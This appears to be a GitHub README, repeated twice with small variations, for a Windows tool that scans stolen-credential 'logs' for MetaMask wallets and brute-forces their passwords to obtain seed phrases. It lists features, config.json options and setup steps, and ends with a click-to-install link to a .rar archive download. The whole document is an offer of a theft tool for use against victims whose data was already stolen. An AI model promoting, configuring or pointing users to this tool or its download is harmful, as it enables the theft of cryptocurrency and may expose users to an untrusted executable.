This software is a program for searching MetaMask wallets in the logs and brute force a lot of passwords to get seed phrases and passwords from wallets.

What is its advantage over parsers?
This software is superior to any MetaMask wallet parser, at least in that you don't need to search and search for passwords to log in, which can be quite problematic. Bruteforcer will find all MetaMask wallets on its own and search for passwords not only from the logs, but also generate new ones based on those obtained from the logs. And if that doesn't help either, you can use your own personal password dictionary, which, by the way, will be automatically replenished after each of your bruteforces.

Functionality:
1. Check public logs and delete them using the method of searching for keywords such as “Cloud”, “Free logs”, in log names and in the UserInformation file.
2. Checking and removing executable files from logs.
3. Using off-the-shelf password dictionaries.
4. Generating passwords based on passwords from logs.
5. Self-replenishing password dictionary consisting of checked logs and generated passwords based on passwords from logs.
6. Multithreading.
7. Monitoring of time spent on bruteforcing.
8. Monitoring of successful and unsuccessful bruteforcing.

How does bruteforcing work?
First, passwords from the logs are used. If none of them match, then passwords that were generated based on the passwords from the logs are used. If even this is not successful, then passwords from a ready-made dictionary are used. Also, passwords from logs and passwords generated on the basis of passwords from logs are written to privat_1, so that with each checked log you can expand your dictionary and make each subsequent bruteforce more efficient.

Setting up and compiling the bruteforcer:
1. Open and modify the config.json file located at the path \XSSMetaBruter\bin\Release.

Value designation in config.json
“pass_dictionary": The path to the finished dictionary.
“threads": The number of threads.
“delete_empty_logs": Whether or not to delete empty logs.
“newdict_path": Path to the file where new passwords for your dictionary will be written.
“check_virus": Removing exe files from the logs.
“check_cloud": Checking for logs from the cloud.
“delete_cloud": Deleting logs from the cloud.
2. Drag and drop the logs folder into the console that opens and press Enter.
3. Wait for the bruteforce to complete; the results will be saved in a txt file next to your bruteforcer exe file.
4. CLICK ON THE PICTURE TO INSTALL


This software is a program for searching MetaMask wallets in the logs and brute force a lot of passwords to get seed phrases and passwords from wallets.

What is its advantage over parsers?
This software is superior to any MetaMask wallet parser, at least in that you don't need to search and search for passwords to log in, which can be quite problematic. Bruteforcer will find all MetaMask wallets on its own and search for passwords not only from the logs, but also generate new ones based on those obtained from the logs. And if that doesn't help either, you can use your own personal password dictionary, which, by the way, will be automatically replenished after each of your bruteforces.

Functionality:
1. Check public logs and delete them using the method of searching for keywords such as “Cloud”, “Free logs”, in log names and in the UserInformation file.
2. Checking and removing executable files from logs.
3. Using off-the-shelf password dictionaries.
4. Generating passwords based on passwords from logs.
5. Self-replenishing password dictionary consisting of checked logs and generated passwords based on passwords from logs.
6. Multithreading.
7. Monitoring of time spent on bruteforcing.
8. Monitoring of successful and unsuccessful bruteforcing.

How does bruteforcing work?
First, passwords from the logs are used. If none of them match, then passwords that were generated based on the passwords from the logs are used. If even this is not successful, then passwords from a ready-made dictionary are used. Also, passwords from logs and passwords generated on the basis of passwords from logs are written to privat_1, so that with each checked log you can expand your dictionary and make each subsequent bruteforce more efficient.

Setting up the bruteforcer
1. Open and modify the config.json file located at the path \XSSMetaBruter\bin\Release.
2. open the exe file at the path XSSMetaBruter\bin\Release\XSSMetaBruter.exe.

Value designation in config.json
“pass_dictionary": Path to the finished dictionary.
“threads": The number of threads.
“delete_empty_logs": Whether or not to delete empty logs.
“newdict_path": Path to the file where new passwords for your dictionary will be written.
“check_virus": Removing exe files from the logs.
“check_cloud": Checking for logs from the cloud.
“delete_cloud": Deleting logs from the cloud.

[![image](https://github.com/user-attachments/assets/8e8e7d9c-c811-4121-b791-51090a03d458)](https://github.com/ethgenius/brutecheker/releases/download/brutemetamask/XSSMetaBruter.rar)
